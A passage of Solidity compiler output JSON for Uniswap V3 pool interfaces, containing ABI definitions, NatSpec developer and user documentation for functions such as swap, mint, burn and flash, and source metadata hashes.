ool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint32[]\",\"name\":\"secondsAgos\",\"type\":\"uint32[]\"}],\"name\":\"observe\",\"outputs\":[{\"internalType\":\"int56[]\",\"name\":\"tickCumulatives\",\"type\":\"int56[]\"},{\"internalType\":\"uint160[]\",\"name\":\"secondsPerLiquidityCumulativeX128s\",\"type\":\"uint160[]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bytes32\",\"name\":\"key\",\"type\":\"bytes32\"}],\"name\":\"positions\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"_liquidity\",\"type\":\"uint128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside0LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthInside1LastX128\",\"type\":\"uint256\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"tokensOwed1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"protocolFees\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"token0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"token1\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"slot0\",\"outputs\":[{\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"},{\"internalType\":\"uint16\",\"name\":\"observationIndex\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinality\",\"type\":\"uint16\"},{\"internalType\":\"uint16\",\"name\":\"observationCardinalityNext\",\"type\":\"uint16\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol\",\"type\":\"uint8\"},{\"internalType\":\"bool\",\"name\":\"unlocked\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"}],\"name\":\"snapshotCumulativesInside\",\"outputs\":[{\"internalType\":\"int56\",\"name\":\"tickCumulativeInside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityInsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsInside\",\"type\":\"uint32\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"zeroForOne\",\"type\":\"bool\"},{\"internalType\":\"int256\",\"name\":\"amountSpecified\",\"type\":\"int256\"},{\"internalType\":\"uint160\",\"name\":\"sqrtPriceLimitX96\",\"type\":\"uint160\"},{\"internalType\":\"bytes\",\"name\":\"data\",\"type\":\"bytes\"}],\"name\":\"swap\",\"outputs\":[{\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int16\",\"name\":\"wordPosition\",\"type\":\"int16\"}],\"name\":\"tickBitmap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"ticks\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"liquidityGross\",\"type\":\"uint128\"},{\"internalType\":\"int128\",\"name\":\"liquidityNet\",\"type\":\"int128\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside0X128\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"feeGrowthOutside1X128\",\"type\":\"uint256\"},{\"internalType\":\"int56\",\"name\":\"tickCumulativeOutside\",\"type\":\"int56\"},{\"internalType\":\"uint160\",\"name\":\"secondsPerLiquidityOutsideX128\",\"type\":\"uint160\"},{\"internalType\":\"uint32\",\"name\":\"secondsOutside\",\"type\":\"uint32\"},{\"internalType\":\"bool\",\"name\":\"initialized\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"details\":\"The pool interface is broken up into many smaller pieces\",\"methods\":{\"burn(int24,int24,uint128)\":{\"details\":\"Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect\",\"params\":{\"amount\":\"How much liquidity to burn\",\"tickLower\":\"The lower tick of the position for which to burn liquidity\",\"tickUpper\":\"The upper tick of the position for which to burn liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 sent to the recipient\",\"amount1\":\"The amount of token1 sent to the recipient\"}},\"collect(address,int24,int24,uint128,uint128)\":{\"details\":\"Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.\",\"params\":{\"amount0Requested\":\"How much token0 should be withdrawn from the fees owed\",\"amount1Requested\":\"How much token1 should be withdrawn from the fees owed\",\"recipient\":\"The address which should receive the fees collected\",\"tickLower\":\"The lower tick of the position for which to collect fees\",\"tickUpper\":\"The upper tick of the position for which to collect fees\"},\"returns\":{\"amount0\":\"The amount of fees collected in token0\",\"amount1\":\"The amount of fees collected in token1\"}},\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"feeGrowthGlobal0X128()\":{\"details\":\"This value can overflow the uint256\"},\"feeGrowthGlobal1X128()\":{\"details\":\"This value can overflow the uint256\"},\"flash(address,uint256,uint256,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback\",\"params\":{\"amount0\":\"The amount of token0 to send\",\"amount1\":\"The amount of token1 to send\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address which will receive the token0 and token1 amounts\"}},\"increaseObservationCardinalityNext(uint16)\":{\"details\":\"This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.\",\"params\":{\"observationCardinalityNext\":\"The desired minimum number of observations for the pool to store\"}},\"initialize(uint160)\":{\"details\":\"Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value\",\"params\":{\"sqrtPriceX96\":\"the initial sqrt price of the pool as a Q64.96\"}},\"liquidity()\":{\"details\":\"This value has no relationship to the total liquidity across all ticks\"},\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"mint(address,int24,int24,uint128,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.\",\"params\":{\"amount\":\"The amount of liquidity to mint\",\"data\":\"Any data that should be passed through to the callback\",\"recipient\":\"The address for which the liquidity will be created\",\"tickLower\":\"The lower tick of the position in which to add liquidity\",\"tickUpper\":\"The upper tick of the position in which to add liquidity\"},\"returns\":{\"amount0\":\"The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback\",\"amount1\":\"The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback\"}},\"observations(uint256)\":{\"details\":\"You most likely want to use #observe() instead of this method to get an observation as of some amount of time ago, rather than at a specific index in the array.\",\"params\":{\"index\":\"The element of the observations array to fetch\"},\"returns\":{\"blockTimestamp\":\"The timestamp of the observation, Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp, Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp, Returns initialized whether the observation has been initialized and the values are safe to use\"}},\"observe(uint32[])\":{\"details\":\"To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick, you must call it with secondsAgos = [3600, 0].The time weighted average tick represents the geometric time weighted average price of the pool, in log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.\",\"params\":{\"secondsAgos\":\"From how long ago each cumulative tick and liquidity value should be returned\"},\"returns\":{\"secondsPerLiquidityCumulativeX128s\":\"Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block timestamp\",\"tickCumulatives\":\"Cumulative tick values as of each `secondsAgos` from the current block timestamp\"}},\"positions(bytes32)\":{\"params\":{\"key\":\"The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper\"},\"returns\":{\"_liquidity\":\"The amount of liquidity in the position, Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke, Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke, Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke, Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke\"}},\"protocolFees()\":{\"details\":\"Protocol fees will never exceed uint128 max in either token\"},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}},\"snapshotCumulativesInside(int24,int24)\":{\"details\":\"Snapshots must only be compared to other snapshots, taken over a period for which a position existed. I.e., snapshots cannot be compared if a position is not held for the entire period between when the first snapshot is taken and the second snapshot is taken.\",\"params\":{\"tickLower\":\"The lower tick of the range\",\"tickUpper\":\"The upper tick of the range\"},\"returns\":{\"secondsInside\":\"The snapshot of seconds per liquidity for the range\",\"secondsPerLiquidityInsideX128\":\"The snapshot of seconds per liquidity for the range\",\"tickCumulativeInside\":\"The snapshot of the tick accumulator for the range\"}},\"swap(address,bool,int256,uint160,bytes)\":{\"details\":\"The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback\",\"params\":{\"amountSpecified\":\"The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)\",\"data\":\"Any data to be passed through to the callback\",\"recipient\":\"The address to receive the output of the swap\",\"sqrtPriceLimitX96\":\"The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap\",\"zeroForOne\":\"The direction of the swap, true for token0 to token1, false for token1 to token0\"},\"returns\":{\"amount0\":\"The delta of the balance of token0 of the pool, exact when negative, minimum when positive\",\"amount1\":\"The delta of the balance of token1 of the pool, exact when negative, minimum when positive\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}},\"ticks(int24)\":{\"params\":{\"tick\":\"The tick to look up\"},\"returns\":{\"liquidityGross\":\"the total amount of position liquidity that uses the pool either as tick lower or tick upper, liquidityNet how much liquidity changes when the pool price crosses the tick, feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0, feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1, tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick, secondsOutside the seconds spent on the other side of the tick from the current tick, initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false. Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0. In addition, these values are only relative and must be used only in comparison to previous snapshots for a specific position.\"}}},\"title\":\"The interface for a Uniswap V3 Pool\"},\"userdoc\":{\"methods\":{\"burn(int24,int24,uint128)\":{\"notice\":\"Burn liquidity from the sender and account tokens owed for the liquidity to the position\"},\"collect(address,int24,int24,uint128,uint128)\":{\"notice\":\"Collects tokens owed to a position\"},\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"feeGrowthGlobal0X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool\"},\"feeGrowthGlobal1X128()\":{\"notice\":\"The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool\"},\"flash(address,uint256,uint256,bytes)\":{\"notice\":\"Receive token0 and/or token1 and pay it back, plus a fee, in the callback\"},\"increaseObservationCardinalityNext(uint16)\":{\"notice\":\"Increase the maximum number of price and liquidity observations that this pool will store\"},\"initialize(uint160)\":{\"notice\":\"Sets the initial price for the pool\"},\"liquidity()\":{\"notice\":\"The currently in range liquidity available to the pool\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"mint(address,int24,int24,uint128,bytes)\":{\"notice\":\"Adds liquidity for the given recipient/tickLower/tickUpper position\"},\"observations(uint256)\":{\"notice\":\"Returns data about a specific observation index\"},\"observe(uint32[])\":{\"notice\":\"Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp\"},\"positions(bytes32)\":{\"notice\":\"Returns the information about a position by the position's key\"},\"protocolFees()\":{\"notice\":\"The amounts of token0 and token1 that are owed to the protocol\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"},\"slot0()\":{\"notice\":\"The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally.\"},\"snapshotCumulativesInside(int24,int24)\":{\"notice\":\"Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range\"},\"swap(address,bool,int256,uint160,bytes)\":{\"notice\":\"Swap token0 for token1, or token1 for token0\"},\"tickBitmap(int16)\":{\"notice\":\"Returns 256 packed tick initialized boolean values. See TickBitmap for more information\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"ticks(int24)\":{\"notice\":\"Look up information about a specific tick in the pool\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification\"}},\"settings\":{\"compilationTarget\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":\"IUniswapV3Pool\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/IUniswapV3Pool.sol\":{\"keccak256\":\"0xfe6113d518466cd6652c85b111e01f33eb62157f49ae5ed7d5a3947a2044adb1\",\"urls\":[\"bzz-raw://1c42b9e6f5902ac38dd43e25750939baa7e0c1425dc75afd717c4412731065d5\",\"dweb:/ipfs/QmWaoacnzsucTvBME2o7YgZBZMhaHv7fkj83htHMVWJKWh\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol\":{\"keccak256\":\"0x9453dd0e7442188667d01d9b65de3f1e14e9511ff3e303179a15f6fc267f7634\",\"urls\":[\"bzz-raw://982f4328f956c3e60e67501e759eb292ac487f76460c774c50e9ae4fcc92aae5\",\"dweb:/ipfs/QmRnzEDsaqtd9PJEVcgQi7p5aV5pMSvRUoGZJAdwFUJxgZ\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol\":{\"keccak256\":\"0xe603ac5b17ecdee73ba2b27efdf386c257a19c14206e87eee77e2017b742d9e5\",\"urls\":[\"bzz-raw://8febc9bdb399a4d94bb89f5377732652e2400e4a8dee808201ade6848f9004e7\",\"dweb:/ipfs/QmaKDqYYFU4d2W2iN77aDHptfbFmYZRrMYXHeGpJmM8C1c\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]},\"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol\":{\"keccak256\":\"0x852dc1f5df7dcf7f11e7bb3eed79f0cea72ad4b25f6a9d2c35aafb48925fd49f\",\"urls\":[\"bzz-raw://ed63907c38ff36b0e22bc9ffc53e791ea74f0d4f0e7c257fdfb5aaf8825b1f0f\",\"dweb:/ipfs/QmSQrckghEjs6HVsA5GVgpNpZWvTXMY5eQLF7cN6deFeEg\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {
							"burn(int24,int24,uint128)": {
								"notice": "Burn liquidity from the sender and account tokens owed for the liquidity to the position"
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"notice": "Collects tokens owed to a position"
							},
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"feeGrowthGlobal0X128()": {
								"notice": "The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool"
							},
							"feeGrowthGlobal1X128()": {
								"notice": "The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool"
							},
							"flash(address,uint256,uint256,bytes)": {
								"notice": "Receive token0 and/or token1 and pay it back, plus a fee, in the callback"
							},
							"increaseObservationCardinalityNext(uint16)": {
								"notice": "Increase the maximum number of price and liquidity observations that this pool will store"
							},
							"initialize(uint160)": {
								"notice": "Sets the initial price for the pool"
							},
							"liquidity()": {
								"notice": "The currently in range liquidity available to the pool"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"notice": "Adds liquidity for the given recipient/tickLower/tickUpper position"
							},
							"observations(uint256)": {
								"notice": "Returns data about a specific observation index"
							},
							"observe(uint32[])": {
								"notice": "Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp"
							},
							"positions(bytes32)": {
								"notice": "Returns the information about a position by the position's key"
							},
							"protocolFees()": {
								"notice": "The amounts of token0 and token1 that are owed to the protocol"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							},
							"slot0()": {
								"notice": "The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas when accessed externally."
							},
							"snapshotCumulativesInside(int24,int24)": {
								"notice": "Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range"
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"notice": "Swap token0 for token1, or token1 for token0"
							},
							"tickBitmap(int16)": {
								"notice": "Returns 256 packed tick initialized boolean values. See TickBitmap for more information"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"ticks(int24)": {
								"notice": "Look up information about a specific tick in the pool"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "A Uniswap pool facilitates swapping and automated market making between any two assets that strictly conform to the ERC20 specification"
					}
				}
			},
			"github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolActions.sol": {
				"IUniswapV3PoolActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								}
							],
							"name": "burn",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collect",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "flash",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint16",
									"name": "observationCardinalityNext",
									"type": "uint16"
								}
							],
							"name": "increaseObservationCardinalityNext",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint160",
									"name": "sqrtPriceX96",
									"type": "uint160"
								}
							],
							"name": "initialize",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "int24",
									"name": "tickLower",
									"type": "int24"
								},
								{
									"internalType": "int24",
									"name": "tickUpper",
									"type": "int24"
								},
								{
									"internalType": "uint128",
									"name": "amount",
									"type": "uint128"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "mint",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "amount0",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "amount1",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "bool",
									"name": "zeroForOne",
									"type": "bool"
								},
								{
									"internalType": "int256",
									"name": "amountSpecified",
									"type": "int256"
								},
								{
									"internalType": "uint160",
									"name": "sqrtPriceLimitX96",
									"type": "uint160"
								},
								{
									"internalType": "bytes",
									"name": "data",
									"type": "bytes"
								}
							],
							"name": "swap",
							"outputs": [
								{
									"internalType": "int256",
									"name": "amount0",
									"type": "int256"
								},
								{
									"internalType": "int256",
									"name": "amount1",
									"type": "int256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {
							"burn(int24,int24,uint128)": {
								"details": "Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0Fees must be collected separately via a call to #collect",
								"params": {
									"amount": "How much liquidity to burn",
									"tickLower": "The lower tick of the position for which to burn liquidity",
									"tickUpper": "The upper tick of the position for which to burn liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 sent to the recipient",
									"amount1": "The amount of token1 sent to the recipient"
								}
							},
							"collect(address,int24,int24,uint128,uint128)": {
								"details": "Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity. Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.",
								"params": {
									"amount0Requested": "How much token0 should be withdrawn from the fees owed",
									"amount1Requested": "How much token1 should be withdrawn from the fees owed",
									"recipient": "The address which should receive the fees collected",
									"tickLower": "The lower tick of the position for which to collect fees",
									"tickUpper": "The upper tick of the position for which to collect fees"
								},
								"returns": {
									"amount0": "The amount of fees collected in token0",
									"amount1": "The amount of fees collected in token1"
								}
							},
							"flash(address,uint256,uint256,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallbackCan be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling with 0 amount{0,1} and sending the donation amount(s) from the callback",
								"params": {
									"amount0": "The amount of token0 to send",
									"amount1": "The amount of token1 to send",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address which will receive the token0 and token1 amounts"
								}
							},
							"increaseObservationCardinalityNext(uint16)": {
								"details": "This method is no-op if the pool already has an observationCardinalityNext greater than or equal to the input observationCardinalityNext.",
								"params": {
									"observationCardinalityNext": "The desired minimum number of observations for the pool to store"
								}
							},
							"initialize(uint160)": {
								"details": "Price is represented as a sqrt(amountToken1/amountToken0) Q64.96 value",
								"params": {
									"sqrtPriceX96": "the initial sqrt price of the pool as a Q64.96"
								}
							},
							"mint(address,int24,int24,uint128,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends on tickLower, tickUpper, the amount of liquidity, and the current price.",
								"params": {
									"amount": "The amount of liquidity to mint",
									"data": "Any data that should be passed through to the callback",
									"recipient": "The address for which the liquidity will be created",
									"tickLower": "The lower tick of the position in which to add liquidity",
									"tickUpper": "The upper tick of the position in which to add liquidity"
								},
								"returns": {
									"amount0": "The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback",
									"amount1": "The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback"
								}
							},
							"swap(address,bool,int256,uint160,bytes)": {
								"details": "The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback",
								"params": {
									"amountSpecified": "The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)",
									"data": "Any data to be passed through to the callback",
									"recipient": "The address to receive the output of the swap",
									"sqrtPriceLimitX96": "The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this value after the swap. If one for zero, the price cannot be greater than this value after the swap",
									"zeroForOne": "The direction of the swap, true for token0 to token1, false for token1 to token0"
								},
								"returns": {
									"amount0": "The delta of the balance of token0 of the pool, exact when negative, minimum when positive",
									"amount1": "The delta of the balance of token1 of the pool, exact when negative, minimum when positive"
								}
							}
						},
						"title": "Permissionless pool actions"
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"burn(int24,int24,uint128)": "a34123a7",
